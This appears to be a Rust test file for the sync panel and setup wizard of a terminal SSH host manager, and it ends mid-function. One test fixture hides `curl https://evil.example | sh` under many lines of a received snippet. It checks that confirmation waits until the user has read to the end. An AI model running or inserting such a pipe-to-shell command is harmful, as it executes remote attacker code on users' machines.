//! The folder sync in the TUI: the status bar item, the Sync panel and
//! the wizard at 80×24, events (stale screens, live settings), operation
//! results (`sync_not_pending`, `sync_folder_timeout`), and a real join
//! through the wizard's keys (two engines, one folder, public API only).
//!
//! Captures for the report and the design review (text and truecolour
//! ANSI, Obsidian and Marble, 80×24 and 120×36):
//! `PORTICO_CAPTURE_DIR=… cargo test -p portico-tui sync_captures -- --ignored`.

use std::time::{Duration, Instant};

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use portico_core::engine::HostInventory;
use portico_core::sync::{
    AlertKind, ConflictSide, JoinPreview, PendingHostChange, SyncConflict, SyncDevice, SyncIssue,
    SyncOverview, SyncSnippetValue, SyncSubject, SyncValue, UnconfirmedSnippet,
};
use ratatui::Terminal;
use ratatui::backend::TestBackend;

use super::*;
use crate::app::{Focus, test_app};
use crate::dialog::ARM_DELAY;
use crate::host_list::test_host;
use crate::sync_panel::{PassKind, SyncData};
use crate::sync_wizard::Step;

fn screen(app: &mut App, cols: u16, rows: u16) -> Vec<String> {
    let mut terminal = Terminal::new(TestBackend::new(cols, rows)).unwrap();
    terminal.draw(|f| crate::ui::render(app, f)).unwrap();
    let buffer = terminal.backend().buffer();
    (0..rows)
        .map(|y| {
            (0..cols)
                .map(|x| buffer.cell((x, y)).map_or(" ", |c| c.symbol()))
                .collect()
        })
        .collect()
}

fn text(app: &mut App, cols: u16, rows: u16) -> String {
    screen(app, cols, rows).join("\n")
}

fn key(code: KeyCode) -> KeyEvent {
    KeyEvent::new(code, KeyModifiers::NONE)
}

fn host_value(hostname: &str) -> portico_core::sync::SyncHostValue {
    portico_core::sync::SyncHostValue {
        hostname: hostname.into(),
        user: Some("deploy".into()),
        port: Some(22),
        identity_file: Some("~/.ssh/id_ed25519".into()),
        proxy_jump: Some("bastion".into()),
    }
}

fn now_unix() -> i64 {
    time::OffsetDateTime::now_utc().unix_timestamp()
}

fn idle(conflicts: usize) -> SyncOverview {
    SyncOverview {
        status: SyncStatus::Idle {
            last_pass: now_unix() - 120,
            devices: 2,
            conflicts,
            issues: 1,
            pending_confirmations: 1,
        },
        folder: Some("/home/alice/Dropbox/Portico".into()),
        device: Some("3f9c0ae1aa".into()),
        remember_key: true,
    }
}

fn devices() -> Vec<SyncDevice> {
    vec![
        SyncDevice {
            id: "3f9c0ae1".repeat(4),
            name: "laptop".into(),
            label: "laptop (3f9c0ae1)".into(),
            this_device: true,
            seq: 12,
            published_at: Some(now_unix() - 120),
            last_seen: Some(now_unix() - 120),
            stale: false,
            revoked: false,
        },
        SyncDevice {
            id: "77a1b2c3".repeat(4),
            name: "desk".into(),
            label: "desk (77a1b2c3)".into(),
            this_device: false,
            seq: 40,
            published_at: Some(now_unix() - 3600 * 3),
            last_seen: Some(now_unix() - 3600 * 3),
            stale: false,
            revoked: false,
        },
        SyncDevice {
            id: "0b5e7d21".repeat(4),
            name: "old-mac".into(),
            label: "old-mac (0b5e7d21)".into(),
            this_device: false,
            seq: 3,
            published_at: None,
            last_seen: Some(now_unix() - 86_400 * 200),
            stale: true,
            revoked: false,
        },
    ]
}

fn conflicts() -> Vec<SyncConflict> {
    vec![
        SyncConflict {
            id: "c-tags".into(),
            sides_hash: "h-c-tags".into(),
            subject: SyncSubject::HostMeta {
                alias: "web".into(),
                field: "tags".into(),
            },
            sides: vec![
                ConflictSide {
                    index: 0,
                    devices: vec!["desk (77a1b2c3)".into()],
                    local: false,
                    at: now_unix() - 600,
                    value: SyncValue::Tags(vec!["prod".into(), "eu".into()]),
                },
                ConflictSide {
                    index: 1,
                    devices: vec!["laptop (3f9c0ae1)".into()],
                    local: true,
                    at: now_unix() - 300,
                    value: SyncValue::Tags(vec!["prod".into(), "web".into()]),
                },
            ],
        },
        SyncConflict {
            id: "c-host".into(),
            sides_hash: "h-c-host".into(),
            subject: SyncSubject::Host { alias: "db".into() },
            sides: vec![
                ConflictSide {
                    index: 0,
                    devices: vec!["desk (77a1b2c3)".into()],
                    local: false,
                    at: now_unix() - 600,
                    value: SyncValue::Host(host_value("10.0.1.9")),
                },
                ConflictSide {
                    index: 1,
                    devices: vec!["laptop (3f9c0ae1)".into()],
                    local: true,
                    at: now_unix() - 300,
                    value: SyncValue::Host(host_value("10.0.1.5")),
                },
            ],
        },
    ]
}

/// A long destination: every character must be on screen.
const LONG_HOST: &str = "ip-10-20-30-40.eu-west-3.compute.internal.example-corp.net";
const LONG_COMMAND: &str = "kubectl --context prod-eu-west-3 -n payments rollout restart deployment/payments-api && kubectl --context prod-eu-west-3 -n payments rollout status deployment/payments-api --timeout=300s\necho done";

fn pending() -> Vec<PendingHostChange> {
    vec![
        PendingHostChange {
            alias: "web".into(),
            new: false,
            current: Some(host_value("10.0.0.5")),
            incoming: host_value(LONG_HOST),
            renamed_from: None,
            devices: vec!["desk (77a1b2c3)".into()],
            destination_hash: "hash-web".into(),
        },
        PendingHostChange {
            alias: "staging".into(),
            new: true,
            current: None,
            incoming: host_value("10.9.0.2"),
            renamed_from: Some("stage".into()),
            devices: vec!["desk (77a1b2c3)".into()],
            destination_hash: "hash-staging".into(),
        },
    ]
}

fn snippets() -> Vec<UnconfirmedSnippet> {
    vec![UnconfirmedSnippet {
        id: "restart-payments".into(),
        snippet: SyncSnippetValue {
            name: "Restart payments".into(),
            command: LONG_COMMAND.into(),
            description: Some("Rolling restart of the payments API.".into()),
            run: true,
        },
        devices: vec!["studio-mac (3f9c0ae1)".into()],
        hash: "hash-snippet".into(),
    }]
}

/// The host list with three hosts, sync on, things to review.
fn synced_app() -> App {
    let mut app = test_app();
    app.update(Action::HostsLoaded(Ok(HostInventory {
        hosts: vec![
            test_host("web", None),
            test_host("db", None),
            test_host("lab", None),
        ],
        warnings: Vec::new(),
    })));
    let t = Instant::now()
        .checked_sub(ARM_DELAY * 2)
        .unwrap_or_else(Instant::now);
    app.sync = SyncData {
        overview: Some(idle(2)),
        conflicts: 2,
        ..SyncData::default()
    };
    app.sync.set_pending(pending(), t);
    app.sync.set_snippets(snippets(), t);
    app.sync.changed_at = Some(t);
    app
}

fn open_panel(app: &mut App, tab: SyncTab) {
    app.update(Action::OpenSync);
    let panel = app.sync_panel.as_mut().unwrap();
    panel.tab = tab;
    panel.selected_at = Instant::now()
        .checked_sub(ARM_DELAY * 2)
        .unwrap_or_else(Instant::now);
    app.update(Action::SyncDevices(Ok(devices())));
    app.update(Action::SyncConflicts(Ok(conflicts())));
    app.update(Action::SyncIssues(Ok(vec![SyncIssue {
        key: "host:legacy".into(),
        subject: Some(SyncSubject::Host {
            alias: "legacy".into(),
        }),
        summary: portico_core::ErrorSummary {
            code: "sync_alias_shadowed".into(),
            message: "`legacy` is already defined in ~/.ssh/config".into(),
            hint: Some("Rename one of them, or skip it on this device.".into()),
        },
        warning: false,
        skippable: true,
    }])));
}

#[test]
fn the_status_bar_says_how_sync_is_doing() {
    let mut app = synced_app();
    let lines = screen(&mut app, 80, 24);
    let bar = lines.last().unwrap();
    assert!(bar.contains("⇅ Synced 2 min ago"), "{bar}");
    assert!(bar.contains("2 conflicts"), "{bar}");
    assert!(bar.contains("3 to review"), "{bar}");
    // The host list marks the host whose destination waits, the details
    // say by whom.
    let all = lines.join("\n");
    assert!(all.contains("web ⇅"), "{all}");
    // B15: the device id only from 120 columns.
    assert!(all.contains("⇅ changed by desk · S review"), "{all}");
    assert!(all.contains("wait for your confirmation"), "{all}");
    let wide = text(&mut app, 120, 36);
    assert!(wide.contains("changed by desk (77a1b2c3)"), "{wide}");

    // Sync off, nothing waiting: `Sync off`, only when there is room.
    let mut app = test_app();
    app.sync.overview = Some(SyncOverview {
        status: SyncStatus::Disabled,
        folder: None,
        device: None,
        remember_key: true,
    });
    let wide = screen(&mut app, 160, 24);
    assert!(wide.last().unwrap().contains("⇅ Sync off"));
    let narrow = screen(&mut app, 80, 24);
    assert!(narrow.last().unwrap().contains("quit"), "quit is kept");
}

#[test]
fn panel_overview_and_devices_at_80x24() {
    let mut app = synced_app();
    open_panel(&mut app, SyncTab::Overview);
    let lines = screen(&mut app, 80, 24);
    let all = lines.join("\n");
    for want in [
        "Synced 2 min ago",
        "Dropbox/Portico",
        "sync now",
        "turn sync off",
        // B5: the GUI's tabs, in its order.
        "Overview",
        "Conflicts 2",
        "Received 3",
        "Issues 1",
        "Devices",
    ] {
        assert!(all.contains(want), "{want}:\n{all}");
    }
    // B15: the panel's keys are not said twice: the bar points to `?`.
    let bar = lines.last().unwrap();
    assert!(bar.contains("SYNC") && bar.contains("?  help"), "{bar}");
    assert!(!bar.contains("sync now"), "{bar}");

    open_panel(&mut app, SyncTab::Devices);
    let all = text(&mut app, 80, 24);
    for want in [
        "● laptop (3f9c0ae1)",
        "this device",
        "desk (77a1b2c3)",
        "inactive",
    ] {
        assert!(all.contains(want), "{want}:\n{all}");
    }
}

/// B2 (S1c review): the core quotes identifiers; the alias stays as
/// written (never `Legacy`), without its backticks.
#[test]
fn legacy_is_already_defined() {
    let mut app = synced_app();
    open_panel(&mut app, SyncTab::Issues);
    let all = text(&mut app, 80, 24);
    assert!(
        all.contains("Host legacy · legacy is already defined"),
        "{all}"
    );
    assert!(!all.contains('`'), "{all}");
}

#[test]
fn received_hosts_show_both_destinations_whole() {
    let mut app = synced_app();
    open_panel(&mut app, SyncTab::Received);
    let lines = screen(&mut app, 120, 36);
    let all = lines.join("\n");
    assert!(all.contains("On this device"), "{all}");
    assert!(all.contains("10.0.0.5"), "{all}");
    // Wrapped, never cut: the pieces put back together.
    // (The `◂` mark of a changed value is not part of it.)
    let joined: String = lines
        .iter()
        .map(|l| l.replace([' ', '│', '◂'], ""))
        .collect();
    assert!(joined.contains(LONG_HOST), "{all}");
    assert!(all.contains('◂'), "the changed value is marked: {all}");
    assert!(!all.contains("example-corp…"), "{all}");
    // B15: wrapped where it reads, after a `.` or a `-`.
    assert!(all.contains("ip-10-20-30-40.eu-west-3.compute.  "), "{all}");
    assert!(all.contains("  internal.example-corp.net  "), "{all}");
    // No bulk confirmation: `y` confirms the item shown.
    assert!(all.contains("confirm"), "{all}");
    assert!(!all.to_lowercase().contains("confirm all"), "{all}");
}

/// A1 (S1c review, TUI parity with the GUI): at 80×24 the card of a
/// received item does not fit; `y` waits until its last line has been on
/// screen.
#[test]
fn a_received_item_is_confirmed_only_once_read_to_the_end() {
    let mut app = synced_app();
    let long: Vec<String> = (1..=12).map(|i| format!("echo step {i}")).collect();
    app.sync.snippets = vec![UnconfirmedSnippet {
        snippet: SyncSnippetValue {
            command: format!("{}\ncurl https://evil.example | sh", long.join("\n")),
            ..snippets().remove(0).snippet
        },
        ..snippets().remove(0)
    }];
    select_snippet(&mut app);
    let all = text(&mut app, 80, 24);
    assert!(all.contains("more"), "the end is below the fold: {all}");
    assert!(all.contains("read to the end"), "{all}");
    app.update(Action::SyncKey(key(KeyCode::Char('y'))));
    assert!(
        app.sync_panel.as_ref().unwrap().busy.is_none(),
        "nothing sent before the end was shown"
    );
    for _ in 0..10 {
        app.update(Action::SyncKey(key(KeyCode::PageDown)));
        let _ = text(&mut app, 80, 24);
    }
    assert!(app.sync_panel.as_ref().unwrap().read_to_end(&app.sync));
    app.update(Action::SyncKey(key(KeyCode::Char('y'))));
    assert!(
        app.sync_panel.as_ref().unwrap().busy.is_some(),
        "confirmed once read"
    );
}

fn select_snippet(app: &mut App) {
    open_panel(app, SyncTab::Received);
    let panel = app.sync_panel.as_mut().unwrap();
    panel.select_snippet(&app.sync, "restart-payments");
}

#[test]
fn received_snippets_show_the_whole_command() {
    let mut app = synced_app();
    select_snippet(&mut app);
    let lines = screen(&mut app, 120, 36);
    let joined: String = lines.iter().map(|l| l.replace([' ', '│'], "")).collect();
    for line in LONG_COMMAND.lines() {
        assert!(
            joined.contains(&line.replace(' ', "")),
            "{}",
            lines.join("\n")
        );
    }
    let all = lines.join("\n");
    assert!(
        all.contains("▲ Runs as soon as it is sent (Enter is added)."),
        "{all}"
    );
    assert!(all.contains("2 lines · 196 characters"), "{all}");
    // B14: the device that wrote it.
    assert!(all.contains("Changed by studio-mac (3f9c0ae1)."), "{all}");
}

/// A2 (S1c review): a tab of a received command is typed with the rest:
/// it shows, as a muted `→`, never dropped.
#[test]
fn a_received_command_shows_its_tabs() {
    let mut app = synced_app();
    app.sync.snippets = vec![UnconfirmedSnippet {
        snippet: SyncSnippetValue {
            command: "printf 'a\tb'\tid".into(),
            ..snippets().remove(0).snippet
        },
        ..snippets().remove(0)
    }];
    select_snippet(&mut app);
    let all = text(&mut app, 120, 36);
    assert!(all.contains("printf 'a→b'→id"), "{all}");
}

/// A4 (S1c review): a copied passphrase is cleared from the clipboard 30 s
/// later, unless Portico copied something else meanwhile.
#[test]
fn a_copied_passphrase_is_cleared_unless_overwritten() {
    let mut app = test_app();
    app.clipboard = false;
    app.copy_passphrase("alpha beta gamma");
    let copied = app.clipboard_secret.get();
    assert!(
        app.toast
            .as_ref()
            .is_some_and(|t| t.message == "Copied — cleared from the clipboard in 30 s")
    );
    app.update(Action::SyncClearClipboard(copied));
    assert_ne!(
        app.clipboard_secret.get(),
        copied,
        "cleared (an empty copy)"
    );
    // Something else copied after it: its clearing no longer applies.
    app.copy_passphrase("alpha beta gamma");
    let copied = app.clipboard_secret.get();
    app.osc52("another text");
    let after = app.clipboard_secret.get();
    app.update(Action::SyncClearClipboard(copied));
    assert_eq!(app.clipboard_secret.get(), after, "left alone");
}

#[test]
fn conflicts_preselect_union_and_mark_differing_fields() {
    let mut app = synced_app();
    open_panel(&mut app, SyncTab::Conflicts);
    let all = text(&mut app, 80, 24);
    assert!(all.contains("Tags of web"), "{all}");
    assert!(all.contains("● Union of all tags"), "{all}");
    assert!(all.contains("Keep desk (77a1b2c3)'s"), "{all}");
    assert!(all.contains("#prod #eu #web"), "{all}");
}

#[test]
fn a_reload_in_flight_blocks_decisions() {
    let mut app = synced_app();
    open_panel(&mut app, SyncTab::Received);
    app.sync_panel.as_mut().unwrap().seen_end = Some("hash-web".into());
    app.update(Action::Engine(EngineEvent::SyncPendingChanged));
    assert!(app.sync.stale());
    app.update(Action::SyncKey(key(KeyCode::Char('y'))));
    assert!(
        app.sync_panel.as_ref().unwrap().busy.is_none(),
        "nothing sent"
    );
    // Back with new content: armed again only after a while.
    app.update(Action::SyncPending(Ok(vec![PendingHostChange {
        destination_hash: "hash-web-2".into(),
        ..pending().remove(0)
    }])));
    app.update(Action::SyncSnippets(Ok(snippets())));
    assert!(!app.sync.stale());
    app.update(Action::SyncKey(key(KeyCode::Char('y'))));
    assert!(app.sync_panel.as_ref().unwrap().busy.is_none());
}

#[test]
fn results_say_what_happened() {
    let mut app = synced_app();
    open_panel(&mut app, SyncTab::Received);
    app.update(Action::SyncDone {
        op: SyncOp::ConfirmHost("web".into()),
        result: Err(portico_core::ErrorSummary {
            code: "sync_not_pending".into(),
            message: "web no longer waits for a confirmation".into(),
            hint: None,
        }),
    });
    let notice = app.sync_panel.as_ref().unwrap().notice.clone().unwrap();
    assert!(!notice.ok && notice.message.contains("changed since"));
    app.update(Action::SyncDone {
        op: SyncOp::SyncNow,
        result: Err(portico_core::ErrorSummary {
            code: "sync_folder_timeout".into(),
            message: "the sync folder did not answer in time".into(),
            hint: None,
        }),
    });
    let notice = app.sync_panel.as_ref().unwrap().notice.clone().unwrap();
    assert!(notice.hint.unwrap().contains("still finish"));
    app.update(Action::SyncDone {
        op: SyncOp::ConfirmHost("web".into()),
        result: Ok(Some(SyncStatus::Syncing)),
    });
    let notice = app.sync_panel.as_ref().unwrap().notice.clone().unwrap();
    assert!(notice.ok && notice.message.starts_with("web confirmed"));
    assert_eq!(app.sync.status(), Some(&SyncStatus::Syncing));
}

#[test]
fn settings_received_through_sync_apply_live() {
    let mut app = test_app();
    let settings = portico_core::settings::Settings {
        theme: Some("marble".into()),
        ..portico_core::settings::Settings::default()
    };
    app.update(Action::Engine(EngineEvent::SettingsChanged { settings }));
    assert_eq!(app.theme.theme().id, "marble");
}

#[test]
fn the_wizard_gates_create_on_the_recovery_box() {
    let mut app = test_app();
    app.sync.overview = Some(SyncOverview {
        status: SyncStatus::Disabled,
        folder: None,
        device: None,
        remember_key: true,
    });
    app.update(Action::OpenSync);
    let all = text(&mut app, 80, 24);
    assert!(all.contains("Sync is off on this device."), "{all}");
    assert!(
        all.contains("Only encrypted files leave this machine"),
        "{all}"
    );
    app.update(Action::SyncKey(key(KeyCode::Enter)));
    assert_eq!(app.overlay, Some(Overlay::SyncWizard));
    let all = text(&mut app, 80, 24);
    assert!(all.contains("known_hosts are"), "{all}");
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    for c in "~/Dropbox/Portico".chars() {
        app.update(Action::SyncWizardKey(key(KeyCode::Char(c))));
    }
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    assert!(app.sync_wizard.as_ref().unwrap().probing);
    app.update(Action::SyncProbed {
        folder: "~/Dropbox/Portico".into(),
        result: Ok(portico_core::sync::FolderProbe::Usable),
    });
    assert!(text(&mut app, 80, 24).contains("No Portico sync here yet."));
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    let wizard = app.sync_wizard.as_ref().unwrap();
    assert!(matches!(wizard.step, Step::Create));
    assert_eq!(wizard.form.kind, PassKind::Create);
    let all = text(&mut app, 80, 24);
    assert!(all.contains("Strength"), "{all}");
    assert!(all.contains("Remember the key on this device"), "{all}");
    for c in "correct horse battery staple".chars() {
        app.update(Action::SyncWizardKey(key(KeyCode::Char(c))));
    }
    app.update(Action::SyncWizardKey(key(KeyCode::Tab)));
    for c in "correct horse battery staple".chars() {
        app.update(Action::SyncWizardKey(key(KeyCode::Char(c))));
    }
    // Q1: nothing is created before "I saved it…", on the same step.
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    assert!(matches!(
        app.sync_wizard.as_ref().unwrap().step,
        Step::Create
    ));
    let all = text(&mut app, 80, 24);
    assert!(all.contains("cannot be recovered"), "{all}");
    assert!(all.contains("I saved it."), "{all}");
    assert!(
        all.contains("Save the passphrase, then check this box"),
        "{all}"
    );
    app.update(Action::SyncWizardKey(key(KeyCode::Char(' '))));
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    assert!(matches!(
        app.sync_wizard.as_ref().unwrap().step,
        Step::Working(_)
    ));
    // The passphrase left the form with the request.
    assert!(app.sync_wizard.as_ref().unwrap().form.new.is_empty());
    // A weak passphrase: back to the form, the core's words under it.
    app.update(Action::SyncSetUp(Err(portico_core::ErrorSummary {
        code: "sync_passphrase_weak".into(),
        message: "the sync passphrase is too weak".into(),
        hint: Some("Use the generator, or at least five random words.".into()),
    })));
    let all = text(&mut app, 80, 24);
    assert!(
        all.contains("Too weak") || all.contains("too weak"),
        "{all}"
    );
    assert!(all.contains("five random words"), "{all}");

    // Success: the wizard closes onto the panel, "Sync is on".
    app.update(Action::SyncSetUp(Ok(SyncStatus::Syncing)));
    assert!(app.sync_wizard.is_none());
    assert_eq!(app.overlay, Some(Overlay::Sync));
    let notice = app.sync_panel.as_ref().unwrap().notice.clone().unwrap();
    assert!(notice.ok && notice.message == "Sync is on");
}

#[test]
fn an_expired_review_asks_for_the_passphrase_again() {
    let mut app = test_app();
    app.update(Action::OpenSync);
    app.sync.overview = Some(SyncOverview {
        status: SyncStatus::Disabled,
        folder: None,
        device: None,
        remember_key: true,
    });
    app.update(Action::SyncKey(key(KeyCode::Enter)));
    let wizard = app.sync_wizard.as_mut().unwrap();
    wizard.form = crate::sync_panel::PassForm::new(PassKind::Join, "laptop".into());
    wizard.previewed(
        JoinPreview {
            token: "t".into(),
            devices: devices(),
            hosts: 12,
            host_meta: 30,
            snippets: 4,
            settings: 3,
            conflicts: 2,
            needs_newer: 1,
            rejoin: false,
        },
        Instant::now(),
    );
    let all = text(&mut app, 80, 24);
    assert!(all.contains("12 hosts"), "{all}");
    assert!(all.contains("2 conflicts"), "{all}");
    assert!(all.contains("Review each conflict"), "{all}");
    assert!(all.contains("wait for your confirmation"), "{all}");
    assert!(all.contains("30 tags, groups, notes"), "{all}");
    // Q1: the box gates Join.
    assert!(all.contains("I saved it."), "{all}");
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    assert!(matches!(
        app.sync_wizard.as_ref().unwrap().step,
        Step::Review
    ));
    assert!(text(&mut app, 80, 24).contains("Save the passphrase, then check this box"));
    app.update(Action::SyncWizardKey(key(KeyCode::Char(' '))));
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    assert!(matches!(
        app.sync_wizard.as_ref().unwrap().step,
        Step::Working(_)
    ));
    app.update(Action::SyncSetUp(Err(portico_core::ErrorSummary {
        code: "sync_join_expired".into(),
        message: "the join review expired".into(),
        hint: Some("Type the passphrase again.".into()),
    })));
    let wizard = app.sync_wizard.as_ref().unwrap();
    assert!(matches!(wizard.step, Step::Join));
    assert!(wizard.preview.is_none());
}

#[test]
fn alerts_explain_and_offer_acknowledging() {
    let mut app = synced_app();
    app.sync.overview = Some(SyncOverview {
        status: SyncStatus::Alert {
            kind: AlertKind::PassphraseChanged,
            device: Some("desk (77a1b2c3)".into()),
        },
        ..idle(0)
    });
    open_panel(&mut app, SyncTab::Overview);
    let all = text(&mut app, 80, 24);
    assert!(
        all.contains("The passphrase was changed or reset on desk (77a1b2c3)."),
        "{all}"
    );
    assert!(all.contains("acknowledge"), "{all}");
    assert!(screen(&mut app, 80, 24).last().unwrap().contains("SYNC"));
}

// ── a real join through the wizard ─────────────────────────────────────────

async fn pump(
    app: &mut App,
    events: &mut tokio::sync::broadcast::Receiver<EngineEvent>,
    done: impl FnMut(&App) -> bool,
) {
    app.pump_until(events, done).await;
}

/// Device A creates a sync with a Portico host; this app joins through
/// the wizard's keys; the host waits for a confirmation, `y` (once armed)
/// confirms the destination shown, and the next pass writes it.
#[tokio::test]
#[allow(clippy::too_many_lines)] // one scenario, two devices, end to end
async fn join_through_the_wizard_then_confirm_a_received_host() {
    use portico_core::managed_hosts::HostDraft;
    use portico_core::sync::{NewPassphrase, SyncCreate, generate_passphrase};

    let other = crate::ssh_support::Env::new("");
    let me = crate::ssh_support::Env::new("");
    let shared = tempfile::tempdir().unwrap();
    other
        .engine
        .create_host(HostDraft {
            alias: "web".into(),
            hostname: "203.0.113.10".into(),
            ..HostDraft::default()
        })
        .await
        .unwrap();
    let passphrase = generate_passphrase().unwrap();
    let typed = secrecy::ExposeSecret::expose_secret(passphrase.as_secret()).to_owned();
    other
        .engine
        .sync_create(SyncCreate {
            folder: shared.path().to_path_buf(),
            passphrase: NewPassphrase::Generated(passphrase),
            device_name: "Laptop".into(),
            remember_key: false,
        })
        .await
        .unwrap();

    let mut events = me.engine.subscribe();
    let mut app = App::new(me.engine.clone());
    app.clipboard = false;
    app.start_sync();
    pump(&mut app, &mut events, |a| a.sync.overview.is_some()).await;
    assert_eq!(app.sync.status(), Some(&SyncStatus::Disabled));
    app.update(Action::OpenSync);
    app.update(Action::SyncKey(key(KeyCode::Enter)));
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    let folder = shared.path().to_string_lossy().into_owned();
    app.update(Action::Paste(folder));
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    pump(&mut app, &mut events, |a| {
        a.sync_wizard.as_ref().is_some_and(|w| !w.probing)
    })
    .await;
    assert!(
        matches!(
            app.sync_wizard.as_ref().unwrap().current_probe(),
            Some(Ok(portico_core::sync::FolderProbe::ExistingBundle {
                devices: 1
            }))
        ),
        "{:?}",
        app.sync_wizard.as_ref().unwrap().probe
    );
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    assert!(app.sync_wizard.as_ref().unwrap().joining());
    app.update(Action::Paste(typed));
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    pump(&mut app, &mut events, |a| {
        a.sync_wizard
            .as_ref()
            .is_some_and(|w| matches!(w.step, Step::Review) || w.error.is_some())
    })
    .await;
    let preview = app
        .sync_wizard
        .as_ref()
        .unwrap()
        .preview
        .as_ref()
        .unwrap()
        .0
        .clone();
    assert_eq!(preview.hosts, 1);
    app.update(Action::SyncWizardKey(key(KeyCode::Char(' '))));
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    pump(&mut app, &mut events, |a| {
        a.sync_wizard.as_ref().is_none_or(|w| w.error.is_some())
    })
    .await;
    assert!(app.sync_wizard.is_none(), "closed onto the panel");
    assert_eq!(app.overlay, Some(Overlay::Sync));

    // The received host waits: never written before the confirmation.
    pump(&mut app, &mut events, |a| {
        a.sync.pending.len() == 1 && !a.sync.stale()
    })
    .await;
    let inventory = me.engine.load_hosts().await.unwrap();
    assert!(!inventory.hosts.iter().any(|h| h.alias == "web"));
    app.update(Action::SyncKey(key(KeyCode::Char('3'))));
    let all = text(&mut app, 120, 36);
    assert!(all.contains("203.0.113.10"), "{all}");
    assert!(all.contains("new from Laptop"), "{all}");
    tokio::time::sleep(ARM_DELAY + Duration::from_millis(50)).await;
    app.update(Action::SyncKey(key(KeyCode::Char('y'))));
    pump(&mut app, &mut events, |a| {
        a.sync_panel
            .as_ref()
            .is_some_and(|p| p.busy.is_none() && p.notice.is_some())
    })
    .await;
    let notice = app.sync_panel.as_ref().unwrap().notice.clone().unwrap();
    assert!(notice.ok, "{notice:?}");
    me.engine.sync_now().await.unwrap();
    let inventory = me.engine.load_hosts().await.unwrap();
    assert!(inventory.hosts.iter().any(|h| h.alias == "web"));
    app.focus = Focus::Hosts;
}

// ── captures ───────────────────────────────────────────────────────────────

/// The buffer as truecolour ANSI (fg, bg, bold), one line per row.
fn ansi(app: &mut App, cols: u16, rows: u16) -> String {
    use std::fmt::Write as _;

    use ratatui::style::{Color, Modifier};
    let mut terminal = Terminal::new(TestBackend::new(cols, rows)).unwrap();
    terminal.draw(|f| crate::ui::render(app, f)).unwrap();
    let buffer = terminal.backend().buffer();
    let rgb = |c: Color| match c {
        Color::Rgb(r, g, b) => Some((r, g, b)),
        _ => None,
    };
    let mut out = String::new();
    for y in 0..rows {
        for x in 0..cols {
            let Some(cell) = buffer.cell((x, y)) else {
                continue;
            };
            out.push_str("\x1b[0");
            if let Some((r, g, b)) = rgb(cell.fg) {
                let _ = write!(out, ";38;2;{r};{g};{b}");
            }
            if let Some((r, g, b)) = rgb(cell.bg) {
                let _ = write!(out, ";48;2;{r};{g};{b}");
            }
            if cell.modifier.contains(Modifier::BOLD) {
                out.push_str(";1");
            }
            out.push('m');
            out.push_str(cell.symbol());
        }
        out.push_str("\x1b[0m\n");
    }
    out
}

/// A screen to capture: the app is set up by the function.
type Setup = fn(&mut App);

#[test]
#[ignore = "writes captures"]
#[allow(clippy::too_many_lines)] // the list of screens
fn sync_captures() {
    let Some(dir) = std::env::var_os("PORTICO_CAPTURE_DIR") else {
        return;
    };
    let dir = std::path::PathBuf::from(dir);
    std::fs::create_dir_all(&dir).unwrap();
    let screens: Vec<(&str, Setup)> = vec![
        ("status", |_| {}),
        ("panel-overview", |a| open_panel(a, SyncTab::Overview)),
        ("panel-conflicts", |a| open_panel(a, SyncTab::Conflicts)),
        ("panel-issues", |a| open_panel(a, SyncTab::Issues)),
        ("panel-devices", |a| open_panel(a, SyncTab::Devices)),
        ("pending-host", |a| open_panel(a, SyncTab::Received)),
        ("pending-host-end", |a| {
            open_panel(a, SyncTab::Received);
            for _ in 0..10 {
                a.update(Action::SyncKey(key(KeyCode::PageDown)));
            }
        }),
        ("snippet-review", select_snippet),
        ("panel-alert", |a| {
            a.sync.overview = Some(SyncOverview {
                status: SyncStatus::Alert {
                    kind: AlertKind::PassphraseChanged,
                    device: Some("desk (77a1b2c3)".into()),
                },
                ..idle(0)
            });
            open_panel(a, SyncTab::Overview);
        }),
        ("panel-off", |a| {
            a.sync.overview = Some(SyncOverview {
                status: SyncStatus::Disabled,
                folder: None,
                device: None,
                remember_key: true,
            });
            open_panel(a, SyncTab::Overview);
        }),
        ("panel-change", |a| {
            open_panel(a, SyncTab::Overview);
            a.update(Action::SyncKey(key(KeyCode::Char('c'))));
            for c in "old".chars() {
                a.update(Action::SyncKey(key(KeyCode::Char(c))));
            }
            a.update(Action::SyncKey(key(KeyCode::Tab)));
            for c in "wide awake".chars() {
                a.update(Action::SyncKey(key(KeyCode::Char(c))));
            }
        }),
        ("wizard-intro", |a| {
            a.sync.overview = None;
            a.update(Action::OpenSync);
            a.sync.overview = Some(SyncOverview {
                status: SyncStatus::Disabled,
                folder: None,
                device: None,
                remember_key: true,
            });
            a.update(Action::SyncKey(key(KeyCode::Enter)));
        }),
        ("wizard-folder", |a| {
            wizard_at_folder(a);
            a.update(Action::SyncProbed {
                folder: "~/Dropbox/Portico".into(),
                result: Ok(portico_core::sync::FolderProbe::ExistingBundle { devices: 2 }),
            });
        }),
        ("wizard-create", |a| {
            wizard_at_folder(a);
            a.update(Action::SyncProbed {
                folder: "~/Dropbox/Portico".into(),
                result: Ok(portico_core::sync::FolderProbe::Usable),
            });
            a.update(Action::SyncWizardKey(key(KeyCode::Enter)));
            for c in "correct horse".chars() {
                a.update(Action::SyncWizardKey(key(KeyCode::Char(c))));
            }
        }),
        ("wizard-generated", |a| {
            wizard_at_folder(a);
            a.update(Action::SyncProbed {
                folder: "~/Dropbox/Portico".into(),
                result: Ok(portico_core::sync::FolderProbe::Usable),
            });
            a.update(Action::SyncWizardKey(key(KeyCode::Enter)));
            a.update(Action::SyncGenerated(
                portico_core::sync::generate_passphrase().map_err(|e| e.summary()),
            ));
        }),
        ("wizard-review", |a| {
            wizard_at_folder(a);
            let wizard = a.sync_wizard.as_mut().unwrap();
            wizard.form = crate::sync_panel::PassForm::new(PassKind::Join, "laptop".into());
            wizard.previewed(
                JoinPreview {
                    token: "t".into(),
                    devices: devices(),
                    hosts: 12,
                    host_meta: 30,
                    snippets: 4,
